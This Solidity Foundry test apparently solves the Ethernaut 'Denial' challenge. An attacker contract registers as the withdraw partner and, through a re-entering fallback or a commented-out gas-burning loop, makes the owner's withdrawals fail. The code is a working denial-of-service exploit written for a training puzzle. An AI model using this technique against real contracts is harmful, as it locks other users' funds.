// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;
pragma experimental ABIEncoderV2;

import {BaseTest} from "test/utils/BaseTest.t.sol";
import {console2} from "forge-std/console2.sol";

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

contract Solution {
    address public contractAddress;
    address public owner;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        owner = msg.sender;
    }

    function attack() public {
        IDenial(contractAddress).setWithdrawPartner(address(this));
    }

    function withdraw() external {
        require(owner == msg.sender, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    function exploit() internal pure {
        uint256 sum;
        for (uint256 index = 0; index < type(uint256).max; index++) {
            sum += 1;
        }
    }

    fallback() external payable {
        contractAddress.call(abi.encodeWithSignature("withdraw()"));
        // exploit();
    }
}

contract DenialTest is BaseTest {
    Solution public solution;

    function setUp() public override {
        super.setUp();
    }

    function test_Attack() public {
        contractAddress = 0x4A7b7Fd3ef5ADD7b996A460cc61e2C7e6B501358;

        solution = new Solution(contractAddress);
        solution.attack();

        uint256 beforeBalance = contractAddress.balance;

        contractAddress.call{gas: 10 ** 6}(abi.encodeWithSignature("withdraw()"));

        uint256 afterBalance = contractAddress.balance;

        require(beforeBalance == afterBalance, "Not successful");
    }
}
